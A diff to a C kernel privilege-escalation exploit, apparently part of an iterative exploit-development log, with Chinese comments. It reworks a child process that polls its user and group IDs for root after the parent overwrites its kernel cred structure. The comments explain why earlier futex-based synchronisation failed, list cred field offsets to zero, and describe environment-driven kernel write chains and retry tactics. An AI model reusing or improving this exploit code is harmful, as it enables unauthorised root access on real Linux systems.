@@ -571,23 +571,34 @@ int run_exploit(int argc, char **argv) {
         if (wr != (ssize_t)sizeof(my_task) || !my_task) _exit(1);
         pr_info("mt33: child pid=%d task=%016zx blocking-for-cred-write\n", getpid(), (size_t)my_task);
         fflush(stdout);
-        uint32_t uaddr = 0;
-        /* mt36: full block like ghostlock child - permanent futex wait */
-        syscall(SYS_futex, &uaddr, FUTEX_WAIT, 1, NULL, NULL, 0);
-        /* parent wakes us after cred write */
-        uid_t ruid, euid, suid;
-        getresuid(&ruid, &euid, &suid);
-        gid_t rgid, egid, sgid;
-        getresgid(&rgid, &egid, &sgid);
-        pr_info("mt45: child ids uid=%d euid=%d suid=%d gid=%d egid=%d sgid=%d\n",
-                getuid(), geteuid(), suid, getgid(), egid, sgid);
-        fflush(stdout);
-        if (getuid() == 0 || geteuid() == 0 || suid == 0 ||
-            getgid() == 0 || egid == 0 || sgid == 0) {
-          pr_success("mt45: CHILD-ROOT (some id field zero) pid=%d\n", getpid());
-          fflush(stdout);
-          _exit(42);
+        /* mt46 ★子进程存活修复★ — 旧 mt36 代码两个致命 bug:
+         * 1) FUTEX_WAIT(&uaddr=0, expected=1): *uaddr(0) != 1 → 立即 EAGAIN，
+         *    子进程根本没阻塞，fork 后毫秒级 _exit(2) → exit_creds 释放 cred
+         *    → 父进程所有写入落在已释放(可能复用)的 slab 上 ← mt36-45 全部
+         *    "no root" 的根因，写原语本身可能一直是好的。
+         * 2) 就算阻塞了，父进程 FUTEX_WAKE 打在自己栈变量 &wu 上，
+         *    fork 后 mm 不同 → futex key 不同 → 跨进程唤醒结构性不可能。
+         * 新机制: 子进程保持存活，200ms 周期自查 6 个 id 字段，命中即 exit(42)。 */
+        for (int poll_i = 0; poll_i < 900; poll_i++) {  /* ~3 min 自检窗 */
+          uid_t ruid, euid, suid;
+          getresuid(&ruid, &euid, &suid);
+          gid_t rgid, egid, sgid;
+          getresgid(&rgid, &egid, &sgid);
+          if (ruid == 0 || euid == 0 || suid == 0 ||
+              rgid == 0 || egid == 0 || sgid == 0) {
+            pr_success("mt46: CHILD-ROOT ids uid=%d euid=%d suid=%d gid=%d egid=%d sgid=%d poll=%d\n",
+                       ruid, euid, suid, rgid, egid, sgid, poll_i);
+            fflush(stdout);
+            _exit(42);
+          }
+          if (poll_i > 0 && (poll_i % 50) == 0) {  /* 10s 心跳 */
+            pr_info("mt46: child alive poll=%d ids uid=%d euid=%d\n", poll_i, ruid, euid);
+            fflush(stdout);
+          }
+          usleep(200000);
         }
+        pr_info("mt46: child self-check timeout (3min), no id hit\n");
+        fflush(stdout);
         _exit(2);
       }
       close(cred_pipe[1]);
@@ -636,12 +647,20 @@ int run_exploit(int argc, char **argv) {
       int got_root = 0;
       for (int att = 1; att <= retries && !got_root; att++) {
         uintptr_t fake_cred = P0_DATA_ALIAS_CONST(INIT_CRED); /* 2026-08-15 mt30: 写 init_cred 指针 (ghostlock W2 经验, RCU 安全) */
-        /* mt45 (P0-A): rotate uid-window candidates across attempts */
+        /* mt46 (P0-A): uid-window 轮扫 + PSELECT_UID_WIN env 覆盖。
+         * 配 PSELECT_RETRY=1 + 每轮新进程用（套 mt25/26 已验证的免毒化纪律），
+         * 窗口由脚本按轮指定，避免进程内连续重试的 trigger-110。
+         * 写入是 8 字节 0，每窗口零写覆盖一对字段（反汇编证实 STORE(a) 为 64-bit）:
+         *   0x04 → uid+gid    0x14 → euid+egid
+         *   0x1c → fsuid+fsgid    0x24 → securebits+cap_inheritable.lo（对照组） */
         static const uintptr_t uid_wins[] = { 0x14, 0x4, 0x1c, 0x24 };
-        cred_uid_ptr = cred_addr + uid_wins[(att - 1) % 4];
+        uintptr_t uid_win = uid_wins[(att - 1) % 4];
+        char *win_env_s = getenv("PSELECT_UID_WIN");
+        if (win_env_s) uid_win = strtoul(win_env_s, NULL, 16);
+        cred_uid_ptr = cred_addr + uid_win;
         snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(cred_uid_ptr - 8));
         snprintf(left_env, sizeof(left_env), "%zx", (size_t)cred_addr);
-        pr_info("mt45: attempt %d window=%zx uid_ptr=%016zx\n", att, (size_t)uid_wins[(att-1)%4], (size_t)cred_uid_ptr);
+        pr_info("mt46: attempt %d window=%zx uid_ptr=%016zx\n", att, (size_t)uid_win, (size_t)cred_uid_ptr);
         /* 2026-08-15 mt32: 改用 PSELECT_W* 写链 (env 优先, util.c 已修) — 不走 tree_left successor 死路
          * WPC = cred_ptr-8 (写目标: parent->rb_right = task+0x780)
          * WRIGHT = init_cred dmap (写入值)
@@ -665,9 +684,8 @@ int run_exploit(int argc, char **argv) {
                   (unsigned long long)slide_read_boot_id(), getuid());
           fflush(stdout);
         }
-        /* mt36: wake child to check cred (child's cred was written) */
-        uint32_t wu = 0;
-        syscall(SYS_futex, &wu, FUTEX_WAKE, 1, NULL, NULL, 0);
+        /* mt46: 子进程 200ms 周期自检，无需唤醒
+         * （旧 FUTEX_WAKE 打在父进程自己栈变量上，fork 后 mm 不同，结构性无效，已删） */
         int cst2 = 0;
         if (waitpid(cred_child, &cst2, WNOHANG) == cred_child) {
           if (WIFEXITED(cst2) && WEXITSTATUS(cst2) == 42) {
